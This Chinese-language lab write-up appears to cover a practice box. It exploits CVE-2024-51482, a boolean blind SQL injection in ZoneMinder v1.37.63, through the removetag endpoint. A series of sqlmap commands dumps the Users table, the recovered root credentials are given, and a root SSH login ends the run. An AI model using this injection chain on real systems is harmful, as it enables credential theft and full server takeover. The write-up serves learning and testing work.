---
description: Easy - Linux / SQL注入 / ZoneMinder v1.37.63
---

# ✔️ CVE-2024-51482

## 建立立足点

### 信息收集

* 使用Nmap对目标系统的开放端口进行扫描，获取到2个开放端口：22 / 80

```bash
nmap -sC -sV -p- -oA cve51482 192.168.147.116 --open
```

<figure><img src="../../.gitbook/assets/1 (39).png" alt=""><figcaption></figcaption></figure>

* 检查80端口上的内容，发现当前目标系统正在运行的软件及其版本号：**ZoneMinder v1.37.63**

<figure><img src="../../.gitbook/assets/2 (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/3 (35).png" alt=""><figcaption></figcaption></figure>

### 漏洞查阅

* 根据已得知的软件zoneminder v1.37.63，查找相关漏洞得知该版本的zoneminder有SQL布尔盲注漏洞：

<figure><img src="../../.gitbook/assets/4 (35).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/5 (36).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

* 使用SQLmap进行注入测试：

```bash
sqlmap -u "http://192.168.147.116/zm/index.php?view=request&request=event&action=removetag&tid=1"
```

<figure><img src="../../.gitbook/assets/6 (38).png" alt=""><figcaption></figcaption></figure>

* 检测当前目标系统存在布尔盲注漏洞：

<figure><img src="../../.gitbook/assets/7 (36).png" alt=""><figcaption></figcaption></figure>

* 获取到db名：zm

```bash
sqlmap -u "http://192.168.147.116/zm/index.php?view=request&request=event&action=removetag&tid=1" --dbs
```

<figure><img src="../../.gitbook/assets/8 (34).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/9 (33).png" alt=""><figcaption></figcaption></figure>

* 获取到tables名：

```bash
sqlmap -u "http://192.168.147.116/zm/index.php?view=request&request=event&action=removetag&tid=1" -D zm --tables
```

<figure><img src="../../.gitbook/assets/10 (34).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/11 (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/12 (30).png" alt=""><figcaption></figcaption></figure>

* 获取columns名：

```bash
sqlmap -u "http://192.168.147.116/zm/index.php?view=request&request=event&action=removetag&tid=1" -D zm -T Users --columns
```

<figure><img src="../../.gitbook/assets/13 (30).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/14 (27).png" alt=""><figcaption></figcaption></figure>

* 获取users名：root

```bash
sqlmap -u "http://192.168.147.116/zm/index.php?view=request&request=event&action=removetag&tid=1" -D zm -T Users -C Username --dump
```

<figure><img src="../../.gitbook/assets/16 (25).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/17 (23).png" alt=""><figcaption></figcaption></figure>

* 获取password（哈希暴破），最终获取到用户名和密码：**root : killzone**

```bash
sqlmap -u "http://192.168.147.116/zm/index.php?view=request&request=event&action=removetag&tid=1" -D zm -T Users -C Password --dump
```

<figure><img src="../../.gitbook/assets/18 (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/19 (23).png" alt=""><figcaption></figcaption></figure>

### ROOT

* 利用有效凭证**root : killzone**进行ssh登录，获取到了shell：

```bash
ssh root@192.168.147.116
# 输密码：killzone
```

<figure><img src="../../.gitbook/assets/20 (20).png" alt=""><figcaption></figcaption></figure>
